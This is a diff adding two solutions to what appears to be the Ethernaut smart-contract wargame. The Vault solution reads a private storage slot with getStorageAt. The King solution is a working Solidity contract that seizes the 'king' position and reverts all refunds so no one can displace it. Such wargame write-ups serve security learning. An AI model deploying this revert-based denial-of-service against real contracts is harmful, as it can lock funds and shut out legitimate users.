@@ -93,6 +93,35 @@ contract hackIt {
 ```
 
 ## 8. Vault
+Essentially your private variables are completely exposed on a public chain simply by using a block explorer. The private visibility simply restricts other contracts from calling it. Ethereum stores data in 32 bytes slots. https://ethereum.stackexchange.com/questions/13910/how-to-read-a-private-variable-from-a-contract
+1. Deploy contract in truffle to get ABI (inside of ./build/contracts), this tells you where the variable is stored (index 1)
+2. truffle console --network ropsten to connect to ropsten (make sure your truffle.js is updated accordingly)
+3. web3.eth.getStorageAt("contract address", index)
+
+## 9. King
+This is a classic example of DDoS with unexpected revert whereby when the contract tries to do a transfer back to you address (contract), your payable fallback function will simply revert (or if you don't have 1) thus ensuring that nobody can overtake your position as king. 
+```
+pragma solidity ^0.4.24;
+
+contract KingForever {
+    
+    address private _victim;
+    
+    constructor(address victim) public payable {
+        _victim = victim;
+    }
+    
+    function throneIsMine() public {
+        _victim.call.value(100000000000000)();
+    }
+    
+    
+    function() public payable {
+        revert("The throne is mine forever");
+    }
+    
+}
+```
 
 
 
